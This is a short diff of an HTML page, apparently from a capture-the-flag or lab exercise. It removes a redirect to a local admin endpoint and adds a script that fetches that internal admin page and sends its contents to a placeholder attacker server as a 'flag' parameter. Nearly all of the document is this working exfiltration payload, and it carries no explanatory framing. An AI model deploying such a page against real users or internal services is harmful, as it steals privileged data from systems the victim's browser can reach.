@@ -3,12 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <script>
-        window.location.href = "http://localhost:5001/admin";
-    </script>
+    <title>Exploiting</title>
 </head>
 <body>
-    <p>If you are not redirected, <a href="http://localhost:5001/admin">click here</a>.</p>
+    <script>
+        fetch("http://localhost:5001/admin")
+            .then(res => res.text())
+            .then(data => {
+                fetch("https://your-attacker-server.com/log?flag=" + encodeURIComponent(data));
+            })
+            .catch(err => console.error("Exploit failed", err));
+    </script>
+    <p>Loading...</p>
 </body>
 </html>
